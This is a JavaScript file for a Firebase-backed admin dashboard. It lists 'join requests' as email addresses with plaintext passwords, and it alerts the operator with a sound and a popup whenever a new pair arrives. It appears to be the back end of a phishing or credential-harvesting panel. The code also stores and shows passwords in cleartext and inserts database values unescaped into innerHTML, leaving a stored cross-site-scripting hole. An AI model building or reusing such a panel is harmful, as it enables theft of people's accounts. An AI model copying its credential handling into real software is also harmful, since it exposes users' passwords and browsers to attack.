import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, onValue, onChildAdded, remove } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCgJA67XUBtysxdEl_6tKl0Tebpr2zkbuw",
  authDomain: "abder-b11b9.firebaseapp.com",
  projectId: "abder-b11b9",
  storageBucket: "abder-b11b9.firebasestorage.app",
  messagingSenderId: "163440280492",
  appId: "1:163440280492:web:203a19b2dc0b79ab313009",
  measurementId: "G-SG3T0841FJ"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const tableBody = document.querySelector("#collectionTable tbody");
const notifications = document.getElementById("notifications");
const notifySound = document.getElementById("notifySound");

const requestsRef = ref(db, 'joinRequests');
let isInitialLoad = true;

// Helper: Convert stored timestamp to readable format
function formatTimestamp(ts) {
  if (!ts) return "N/A";
  const numTs = typeof ts === "string" ? Number(ts) : ts;
  if (isNaN(numTs)) return ts; 
  return new Date(numTs).toLocaleString("en-GB", { timeZone:"Asia/Dhaka" });
}

// Full list update
onValue(requestsRef, (snapshot) => {
  const data = snapshot.val();
  if (!tableBody) return;
  tableBody.innerHTML = '';

  if (!data) {
    if (notifications) notifications.innerHTML = `<p>No requests found</p>`;
    isInitialLoad = false;
    return;
  }

  const keys = Object.keys(data);
  if (notifications) notifications.innerHTML = `<p>${keys.length} requests found</p>`;

  keys.forEach(key => {
    const request = data[key];
    const formattedTime = formatTimestamp(request.timestamp);

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td>${request.email || ''}</td>
      <td><span class="password-cell">${request.password || ''}</span></td>
      <td>${formattedTime}</td>
      <td></td>
    `;

    const deleteBtn = document.createElement("button");
    deleteBtn.innerHTML = `<i class="fas fa-trash-alt"></i> Delete`;
    deleteBtn.onclick = () => window.deleteRequest(key);
    tr.querySelector("td:last-child").appendChild(deleteBtn);

    tableBody.appendChild(tr);
  });

  setTimeout(()=> { isInitialLoad = false; }, 100);
});

// New user added → only notify sound & popup
onChildAdded(requestsRef, (snapshot) => {
  if (isInitialLoad) return;
  const request = snapshot.val();
  if(!request) return;

  try { notifySound.play(); } catch(e){ console.warn("Autoplay blocked."); }

  if(Notification.permission === "granted"){
    new Notification("New request received!", {
      body: `Email: ${request.email || "Unknown user"}`,
      icon: "../logo.png"
    });
  }

  const popup = document.createElement("div");
  popup.className = "popup-alert";
  popup.innerHTML = `<i class="fas fa-bell"></i> New request from <b>${request.email || "Unknown"}</b>`;
  document.body.appendChild(popup);
  setTimeout(()=>popup.remove(),4000);
});

// Delete request with modern popup
window.deleteRequest = function(key){
  const popup = document.createElement("div");
  popup.className = "delete-popup";
  popup.innerHTML = `
    <span>Are you sure you want to delete this request?</span>
    <div>
      <button class="confirm-btn">Yes</button>
      <button class="cancel-btn">No</button>
    </div>
  `;
  document.body.appendChild(popup);

  popup.querySelector(".confirm-btn").onclick = () => {
    remove(ref(db, `joinRequests/${key}`))
      .then(() => {
        popup.remove();
        const donePopup = document.createElement("div");
        donePopup.className = "popup-alert";
        donePopup.innerHTML = `<i class="fas fa-check-circle"></i> Request deleted successfully`;
        document.body.appendChild(donePopup);
        setTimeout(()=>donePopup.remove(),3000);
      })
      .catch(err => alert("Error: "+err.message));
  };

  popup.querySelector(".cancel-btn").onclick = () => popup.remove();
  setTimeout(() => { if(document.body.contains(popup)) popup.remove(); }, 10000);
};
